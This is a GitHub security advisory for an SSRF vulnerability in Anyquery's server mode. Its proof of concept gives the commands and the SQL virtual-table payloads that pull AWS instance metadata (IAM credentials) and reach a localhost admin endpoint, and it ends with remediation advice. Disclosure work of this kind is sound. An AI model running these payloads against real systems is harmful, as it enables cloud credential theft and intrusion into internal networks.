# [H] Anyquery: Server-Side Request Forgery (SSRF) via Unrestricted SQLite Virtual Table Modules in Server Mode

## Summary
Severity: High
Advisory: GHSA-hwrq-8wxh-q4xv
CVE: CVE-2026-54628
CWE: CWE-284, CWE-441, CWE-862, CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-14
Source: https://github.com/advisories/GHSA-hwrq-8wxh-q4xv
Type: github-advisory

## Affected
- Go: `github.com/julien040/anyquery` — affected >=0

## Details
## Summary
Anyquery's `server` mode does not restrict outbound HTTP requests initiated by its built-in SQLite virtual table modules (e.g., `json_reader`, `log_reader`). Unauthenticated attackers connecting to the MySQL-compatible server port can create virtual tables pointing to internal network endpoints or Cloud Metadata IPs (e.g., `http://169.254.169.254/latest/meta-data/`). This allows attackers to perform Server-Side Request Forgery (SSRF), bypassing external firewalls to scan internal ports and exfiltrate cloud credentials.

## Details
When Anyquery is launched in **Server Mode** (`anyquery server`), it binds to a TCP port and accepts MySQL protocol connections. The server handler allows the creation of dynamic virtual tables using modules like `json_reader` or `log_reader`, which internally use `go-getter` to fetch URLs. There is no protection mechanism to prevent fetches to local (127.0.0.0/8), private (10.0.0.0/8), or special (169.254.169.254) IP addresses. 

An attacker can use this to map internal networks, interact with internal APIs, or steal IAM tokens from cloud metadata servers by fetching the data and reading it as a database table.

## PoC (Proof of Concept)
1. Start the server on the victim machine (e.g., an AWS EC2 instance):
   ```bash
   anyquery server --host 0.0.0.0 --port 8070
   ```
2. Connect from an attacker machine:
   ```bash
   mysql -u root -h <VICTIM_IP> -P 8070
   ```
3. Execute the payload to fetch AWS Metadata or hit a local API:
   ```sql
   -- Payload 1: Fetch AWS Cloud Metadata (IAM credentials)
   CREATE VIRTUAL TABLE aws_meta USING log_reader('http://169.254.169.254/latest/meta-data/');
   SELECT * FROM aws_meta;

   -- Payload 2: Access an internal application bound only to localhost
   CREATE VIRTUAL TABLE local_admin USING log_reader('http://localhost:8000/admin');
   SELECT * FROM local_admin LIMIT 10;
   ```

## Impact
- **Confidentiality:** High. Exfiltration of sensitive internal network data or cloud credentials.
- **Integrity:** Low. Possible interaction with state-changing internal REST APIs.
- **Availability:** None.
- **CVSS Score:** 8.6 (High) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`

## Remediation
By default, in Server Mode, remote HTTP fetches to local/private IP ranges and known Cloud Metadata IP addresses should be blocked unless explicitly enabled via configuration.

## References
- https://github.com/julien040/anyquery/security/advisories/GHSA-hwrq-8wxh-q4xv
- https://github.com/julien040/anyquery
- https://github.com/julien040/anyquery/releases/tag/0.4.5
